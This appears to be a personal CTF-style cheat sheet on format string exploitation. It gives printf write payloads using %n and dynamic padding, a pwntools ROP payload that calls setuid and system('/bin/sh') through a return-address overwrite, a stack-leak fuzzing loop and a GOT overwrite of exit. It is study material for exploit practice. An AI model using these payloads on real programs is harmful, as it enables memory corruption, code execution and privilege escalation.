### [Format String Guide](https://axcheron.github.io/exploit-101-format-strings/)

### Format Specifiers
- `%ln` - Writes 8 bytes
- `%n` - Writes 4 bytes
- `%hn` - Writes 2 bytes
- `%hhn` - Writes 1 byte

### Writing memory
- Writing "ABCD" to a buffer (here it's the first argument):
	- `printf("%1145258561x%1$n", buf);`
	- `hex(1145258561)` = `0x44434241`
- Writing "ABCD" to a buffer (Smarter):
	- `printf("%64x%1$hhn%c%2$hhn%c%3$hhn%c%4$hhn", buf, buf+1, buf+2, buf+3);`

### Dynamic Padding
- Pad an amount found on the stack, and therefore copying a value from the stack to another place
- `%*20$d` will write the amount of bytes specified on the 20th argument to `printf`
- Can be used like this:
	 - `%*20$d%48$n`
	- This will copy the value in the 20th argument to the 48th argument, by writing the amount of bytes in the 20th argument to stdout.

### pwntools `fmtstr_payload()` to create format string
```python
payload = fmtstr_payload(
    offset=0x11+6,
    writes={
        return_addr: libc_rop.find_gadget(["pop rdi", "ret"])[0],
        return_addr+8: 0,
        return_addr+16: libc.sym.setuid,
        return_addr+24: libc_rop.find_gadget(["pop rdi", "ret"])[0],
        return_addr+32: next(libc.search(b"/bin/sh\x00")),
        #return_addr+40: libc_rop.find_gadget(["ret"])[0],
        return_addr+40: libc.sym.system
    },
    no_dollars=True,
    numbwritten=already_written,
    offset_bytes=5
)
```


### [Overwriting `rtld_lock_default_lock_recursive` in exit, when full RELRO](https://hxp.io/blog/92/hxp-CTF-2021-zehn-writeup/)
- See level 11 and 11.1 in pwn.college. Also [this](The-danger-of-repetivive-format-string-vulnerabilities-and-abusing-exit-on-full-RELRO)

### Convert memory values to string
```python
# Contains values in memory after format string attack
stack = [0x9fde390,0x804b000,0x80489c3,0xf7fc1d80]

stack = "".join([hex(i)[2:] for i in stack[::-1]])

for i in range(len(stack), 0, -2):
    try:
        print(chr(int(stack[i:i+2],16)), end="")
    except:
        pass
```

### Fuzzing script for fmt
```python
from pwn import *

elf = context.binary = ELF('printf')

for i in range(1, 100):
    io = process(elf.path, level='error')
    io.recvuntil(b"What's your name?\n")
    io.sendline(f"%{i}$p")
    io.recvline()
    output = io.recvline().decode().strip()

    print(f"{i}: {output}")   
    io.close()
```

### Pwntools format string 
```python
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload

def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

format_string = FmtStr(execute_fmt=send_payload, offset=6)
# overwrite exit with main address
format_string.write(elf.got['exit'], elf.symbols['main'])
format_string.execute_writes()
```
